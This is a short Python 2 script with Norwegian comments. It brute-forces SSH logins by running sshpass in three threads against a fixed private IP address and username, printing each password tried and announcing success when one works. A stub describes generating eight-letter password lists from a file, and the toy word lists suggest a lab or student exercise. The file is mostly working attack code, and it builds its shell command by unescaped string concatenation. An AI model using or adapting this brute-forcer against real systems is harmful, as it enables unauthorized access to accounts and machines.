# coding=utf-8
# 32-126 : 20-7E
# Tråder: https://docs.python.org/2/library/threading.html
# Queue: https://www.troyfawkes.com/learn-python-multithreading-queues-basics/

import threading
import time
import commands


def connect_ssh(pword):

        for n in pword:
            result = commands.getoutput("sshpass -p " + n + " ssh sigurda@10.225.147.156 -p 2222")
            print "***********************************************"
            print "Thread name: " + threading.current_thread().getName() + " | " + " Output: " + result

            if result.__contains__("Permission denied"):
                print "Prøvd passord: " + n
            else:
                print "############ DET GIKK :D ############ Passord: " + n

def get_password(self):  # Bytt ut med fungerende passordgenerator
        return "Lese fil og plukke ut passord med åtte bokstaver, legge passord i fire lister"


###### main ######

pw1 = ["hei", "ikke", "gjør", "sånn"]
pw2 = ["hallo", "kake", "lol", "bab"]
pw3 = ["bror", "søster", "pappa", "mamma"]

t1 = threading.Thread(target=connect_ssh, args=(pw1,))
t2 = threading.Thread(target=connect_ssh, args=(pw2,))
t3 = threading.Thread(target=connect_ssh, args=(pw3,))

t1.start()
t2.start()
t3.start()

time.sleep(100)

t1.join()
t2.join()
t3.join()

custom_ascii_STR = (" !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~")
